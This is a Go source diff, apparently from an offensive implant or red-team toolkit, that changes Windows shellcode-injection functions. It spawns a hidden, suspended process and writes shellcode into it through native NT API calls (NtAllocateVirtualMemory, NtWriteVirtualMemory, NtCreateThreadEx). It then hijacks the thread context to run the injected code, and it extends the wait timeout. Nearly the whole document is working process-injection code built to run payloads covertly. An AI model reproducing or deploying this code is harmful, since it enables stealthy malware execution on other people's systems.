@@ -7,6 +7,7 @@ import (
 	"debug/pe"
 	"errors"
 	"fmt"
+	"log"
 	"strconv"
 	"strings"
 	"syscall"
@@ -60,26 +61,40 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	sa.Flags |= windows.STARTF_USESHOWWINDOW
 	sa.ShowWindow = windows.SW_HIDE
 	pi := windows.ProcessInformation{}
-	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sa, &pi)
+	err = windows.CreateProcess(nil, notepad, nil, nil, true, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, nil, nil, &sa, &pi)
 	if err != nil {
 		return "", err
 	}
 	windows.CloseHandle(pi.Thread)
 	windows.CloseHandle(windows.Handle(hChildStdoutWrite))
 	windows.CloseHandle(windows.Handle(hChildStdinRead))
-
 	pidStr := strconv.Itoa(int(pi.ProcessId))
-	hThread, err := RemoteInjectReturnThread(shellcode, pidStr)
+	hThread, threadStart, err := RemoteInjectReturnThread(shellcode, pidStr)
 	if err != nil {
 		return "", err
 	}
+	// get thread context
+	ctx := winapi.CONTEXT{}
+	ctx.ContextFlags = winapi.CONTEXT_INTEGER
+	err = winapi.GetThreadContext(uintptr(hThread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	ctx.Rax = winapi.DWORD64(threadStart)
+	// setting main thread to be our injected code.
+	err = winapi.SetThreadContext(uintptr(hThread), &ctx)
+	if err != nil {
+		return "", err
+	}
+	windows.ResumeThread(windows.Handle(hThread))
 	// now we wait for our thread to finish then send a
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
 	var loops int
 	for {
-		if loops > 60 {
+		if loops > (60 * 5) {
 			// wait 60 seconds max
+			log.Println("5 Minutes HIT!")
 			break
 		}
 		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
@@ -162,12 +177,14 @@ func SpawnInjectReadPipe(shellcode []byte, exeToSpawn string) (string, error) {
 	return completed, nil
 }
 */
+
 func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	arg0, err := syscall.UTF16PtrFromString(exeToSpawn)
 	if err != nil {
 		return "", err
 	}
 	flags := uint32(syscall.CREATE_UNICODE_ENVIRONMENT)
+	flags |= windows.CREATE_NO_WINDOW
 	si := new(windows.StartupInfo)
 	si.Cb = uint32(unsafe.Sizeof(*si))
 	pi := new(windows.ProcessInformation)
@@ -179,7 +196,7 @@ func SpawnInject(shellcode []byte, exeToSpawn string) (string, error) {
 	return RemoteInject(shellcode, pidStr)
 }
 
-func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, error) {
+func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, uintptr, error) {
 	var rights uint32 = windows.PROCESS_CREATE_THREAD |
 		windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION |
@@ -187,11 +204,11 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, err
 		windows.PROCESS_VM_READ
 	intpid, err := strconv.Atoi(pid)
 	if err != nil {
-		return 0, err
+		return 0, 0, err
 	}
 	procHandle, err := rawapi.NtOpenProcess(uint32(intpid), rights)
 	if procHandle == 0 {
-		return 0, err
+		return 0, 0, err
 	}
 	var flProtect uint32 = windows.PAGE_READWRITE
 	var newFlProtect uint32 = windows.PAGE_EXECUTE_READ
@@ -200,18 +217,18 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, err
 	var lens uint64 = uint64(len(shellcode))
 	lpBaseAddress, err = rawapi.NtAllocateVirtualMemory(procHandle, lpBaseAddress, 0, lens, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 	if err != nil || lpBaseAddress == 0 {
-		return 0, err
+		return 0, 0, err
 	}
 	var nBytesWritten *uint32
 	err = rawapi.NtWriteVirtualMemory(uintptr(procHandle), lpBaseAddress, uintptr(unsafe.Pointer((&shellcode[0]))), uintptr(lens), nBytesWritten)
 	if err != nil {
 		windows.CloseHandle(windows.Handle(procHandle))
-		return 0, err
+		return 0, 0, err
 	}
 	err = rawapi.NtProtectVirtualMemory(uintptr(procHandle), lpBaseAddress, &shellcodelen, newFlProtect, &flProtect)
 	if err != nil {
 		windows.CloseHandle(windows.Handle(procHandle))
-		return 0, err
+		return 0, 0, err
 	}
 	var remoteThread uintptr
 	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
@@ -229,9 +246,9 @@ func RemoteInjectReturnThread(shellcode []byte, pid string) (syscall.Handle, err
 	)
 	if err4 != nil {
 		windows.CloseHandle(windows.Handle(procHandle))
-		return 0, err
+		return 0, 0, err
 	}
-	return syscall.Handle(remoteThread), nil
+	return syscall.Handle(remoteThread), lpBaseAddress, nil
 }
 
 func RemoteInject(shellcode []byte, pid string) (string, error) {
